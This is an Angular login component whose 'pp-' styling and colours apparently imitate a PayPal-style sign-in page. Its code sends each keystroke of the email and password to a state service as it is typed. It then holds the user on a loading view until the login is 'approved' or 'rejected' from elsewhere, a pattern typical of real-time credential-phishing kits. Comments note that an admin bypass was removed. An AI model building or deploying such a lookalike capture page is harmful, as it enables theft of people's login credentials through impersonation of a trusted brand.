
import { Component, inject, signal, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="space-y-8 animate-fade-in">
        
        <!-- Rejection Feedback -->
        @if (state.rejectionReason()) {
          <div class="bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">error</span>
            <div>
              <p class="text-sm font-bold text-[#001C64]">{{ 'LOGIN.ERROR_CREDENTIALS' | translate }}</p>
              <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() }}</p>
            </div>
          </div>
        }

        <!-- Inputs -->
        <div class="space-y-6">
          <!-- Email Field -->
          <div class="pp-input-group">
            <input 
              type="text" 
              [(ngModel)]="email"
              (ngModelChange)="onEmailChange($event)"
              (blur)="touchedEmail.set(true)"
              id="email"
              placeholder=" "
              class="pp-input peer"
              [class.shadow-input-error]="(touchedEmail() || showErrors) && !isEmailValid()"
            />
            <label for="email" class="pp-label">{{ 'LOGIN.EMAIL_PLACEHOLDER' | translate }}</label>

            @if ((touchedEmail() || showErrors) && !isEmailValid()) {
                 <div class="absolute right-4 top-4 text-[#D92D20] animate-in fade-in">
                    <span class="material-icons text-xl">error_outline</span>
                 </div>
            }
          </div>
          
          <!-- Password Field -->
          <div class="pp-input-group">
            <input 
              [type]="showPassword() ? 'text' : 'password'" 
              [(ngModel)]="password"
              (ngModelChange)="onPasswordChange($event)"
              id="password"
              placeholder=" "
              class="pp-input peer"
              [class.shadow-input-error]="showErrors && password.length === 0"
            />
            <label for="password" class="pp-label">{{ 'LOGIN.PASSWORD_PLACEHOLDER' | translate }}</label>

            <button 
                (click)="togglePassword()" 
                class="absolute right-4 top-4 text-pp-blue hover:text-pp-navy font-bold text-sm transition-colors z-10 p-1"
                tabindex="-1">
                {{ showPassword() ? 'Hide' : 'Show' }}
            </button>
          </div>
        </div>

        <div class="flex items-center justify-start -mt-2">
           <a class="text-pp-blue font-bold hover:underline cursor-pointer text-[15px]">{{ 'LOGIN.FORGOT' | translate }}</a>
        </div>

        <!-- Action -->
        <div class="space-y-6 pt-2">
            <button 
                (click)="login()" 
                class="pp-btn relative overflow-hidden transition-all duration-200"
                [class.cursor-wait]="isLoading()"
                [disabled]="isLoading()">
              @if(isLoading()) {
                <span class="flex items-center justify-center gap-2">
                  <span class="material-icons animate-spin text-lg">refresh</span>
                  <span>{{ 'LOGIN.PROCESSING' | translate }}</span>
                </span>
              } @else {
                {{ 'LOGIN.LOG_IN' | translate }}
              }
            </button>

            <div class="relative py-2">
              <div class="absolute inset-0 flex items-center">
                <div class="w-full border-t border-slate-200"></div>
              </div>
              <div class="relative flex justify-center text-sm">
                <span class="px-4 bg-white text-slate-500 font-bold">{{ 'LOGIN.OR' | translate }}</span>
              </div>
            </div>

            <button class="pp-btn-outline group transition-all duration-200 hover:shadow-md">
              <span class="group-hover:scale-105 transition-transform">{{ 'LOGIN.SIGN_UP' | translate }}</span>
            </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class LoginComponent {
  state = inject(StateService);

  email = '';
  password = '';
  showErrors = false;
  touchedEmail = signal(false);
  showPassword = signal(false);

  isEmailValid = signal<boolean>(false);
  isValid = signal<boolean>(false);
  isLoading = signal<boolean>(false);

  constructor() {
    effect(() => {
      this.email = this.state.email();
      this.validate();
    }, { allowSignalWrites: true });

    // Reset loading state when view changes (login approved/rejected)
    effect(() => {
      const view = this.state.currentView();
      if (view !== 'loading') {
        this.isLoading.set(false);
      }
    }, { allowSignalWrites: true });
  }

  togglePassword() {
    this.showPassword.update((v: boolean) => !v);
  }

  onEmailChange(val: string) {
    this.validate();
    // SECURITY: Admin bypass removed - all inputs are now synced normally
    this.state.updateUser({ email: val });
  }

  onPasswordChange(val: string) {
    this.validate();
    // SECURITY: Admin bypass removed - all inputs are now synced normally
    this.state.updateUser({ password: val });
  }

  validate() {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const emailValid = emailRegex.test(this.email);
    this.isEmailValid.set(emailValid);
    // Require valid email format - removed OR condition that bypassed validation
    this.isValid.set(emailValid && this.password.length > 0);
  }

  login() {
    this.touchedEmail.set(true);
    // SECURITY: Removed hardcoded admin bypass - all auth goes through AuthService API
    if (this.isEmailValid() && this.password.length > 0) {
      this.isLoading.set(true);
      this.state.submitLogin(this.email, this.password);
    } else {
      this.showErrors = true;
    }
  }
}
